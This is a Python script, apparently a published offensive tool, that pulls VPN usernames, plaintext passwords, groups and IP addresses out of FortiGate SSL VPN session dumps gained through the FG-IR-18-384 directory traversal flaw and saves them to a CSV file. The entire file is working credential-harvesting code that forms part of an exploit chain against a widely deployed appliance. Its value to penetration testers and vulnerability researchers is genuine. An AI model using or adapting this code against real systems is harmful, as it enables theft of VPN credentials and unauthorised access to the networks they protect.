#!/usr/bin/python3

################################################
#      ____    _                   _           #
#     |__  |__| |___ _ __  ___ _ _| |_ ___     #
#       / / -_) / -_) '  \/ -_) ' \  _(_-<     #
#      /_/\___|_\___|_|_|_\___|_||_\__/__/     #
#                                              #
################################################
# Extract Useful info (credentials!) from SSL VPN Directory Traversal Vulnerability (FG-IR-18-384)
# John M (@x41x41x41), David S (@DavidStubley)
# Fortigate

import argparse, os, csv, string, re
from IPy import IP

def parse_folder(folder):
    for entry in os.scandir(folder):
        print(entry.path)
        with open(entry.path, 'rb') as f:
            process = f.read()
            parse(entry.path, process, "empty")


def parse(target, process, subjectCN):
    unprintable = False
    comp = bytearray()
    counter = 0
    foundcount = 0
    for byte in process:
        if byte == 0x00:
            # Throw these out
            counter = counter + 1
            continue
        comp.append(byte)
        comp = comp[-2:]
        if comp == LOOKFOR or comp == LOOKFORTWO or comp == LOOKFORTHREE:
            grabuser(target, process, counter, subjectCN)
            foundcount = foundcount + 1
        counter = counter + 1
    if foundcount == 0:
        containsIP(process, target)


# Commented out as we don't need these but could come in useful for debugging
# print(getBinarytext(process,0,len(process)))
# writeBinary(process, target)

def grabuser(target, process, frombyte, subjectCN):
    extip = grabtext(process, frombyte + 1)
    if isIP(extip):
        username = grabtext(process, frombyte + 37)
        password = grabtext(process, frombyte + 423)
        group = grabtext(process, frombyte + 552)
        print('[!] ' + str(target) + ' (' + subjectCN + ') USERFOUND U:' + str(username) + ', P:' + str(
            password) + ', G:' + str(group) + ', IP:' + str(extip))
        # Prob not the best way to do this but it works...
        RESULTS.append([str(target), str(subjectCN), str(username), str(password), str(group), str(extip)])


# else:
#	print('[?] False Positive: '+extip)

def grabtext(process, startbyte):
    tmpstr = ''
    for byte in process[startbyte:]:
        if byte in PRINTABLE:
            tmpstr += chr(byte)
        else:
            break
    return tmpstr


def writeBinary(process, target):
    f = open('byteoutput_' + target + '.bin', "wb")
    f.write(bytearray(process))


def getBinarytext(process, startbyte, endbyte):
    text = ''
    try:
        unprintable = False
        for byte in process[startbyte:endbyte]:
            if byte in PRINTABLE:
                text = text + chr(byte)
                unprintable = False
            else:
                if unprintable == False:
                    text = text + '...'
                    unprintable = True
    except Exception as e:
        print('[!] ' + str(e))
    return text


def isIP(lookup):
    try:
        IP(lookup)
        return True
    except:
        return False


def containsIP(process, target):
    # Hacky IPv4 check to see if we missed creds whilst egg hunting, if we did spit out the BIN for analysis
    # hexdump -C byteoutput_TARGET.bin | more
    m = re.match(r"((?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)))",
                 getBinarytext(process, 0, len(process)))
    if m:
        print('[?] ' + str(target) + ' IPs found but no creds, check the bytes used to hunt')
        writeBinary(process, target)


print("""  ___ ___  ___ _____ ___ ___   _ _____ ___ 
 | __/ _ \\| _ \\_   _|_ _/ __| /_\\_   _| __|
 | _| (_) |   / | |  | | (_ |/ _ \\| | | _| 
 |_| \\___/|_|_\\ |_| |___\\___/_/ \\_\\_| |___|                                                                   
""")
print("Extract Useful info (credentials!) from Fortifuck dump")
print("Tool developed by @x41x41x41 and @DavidStubley")
print()

# Parse arguments
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--input', default='127.0.0.1', help='Target folder')
parser.add_argument('-o', '--output', default='creds.txt', help='File to output discovered credentials too')
args = parser.parse_args()

# Setup varibles
INPUT = args.input
OUTPUTFILE = args.output
PRINTABLE = set(bytes(string.printable, 'ascii'))
RESULTS = []
LOOKFOR = bytearray([0x5d, 0x01])
LOOKFORTWO = bytearray([0x5c, 0x01])
LOOKFORTHREE = bytearray([0x5f, 0x01])

# Read and kickoff processing
parse_folder(INPUT)

# Output results
count = 0
with open(OUTPUTFILE, mode='a') as csvfile:
    CSV_WRITER = csv.writer(csvfile, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
    CSV_WRITER.writerow(
        [str('Target'), str('SubjectCN'), str('Username'), str('Password'), str('Group'), str('External IP')])
    for result in RESULTS:
        CSV_WRITER.writerow(result)
        count = count + 1
print('[*] Finished ' + str(count) + ' credentials found')
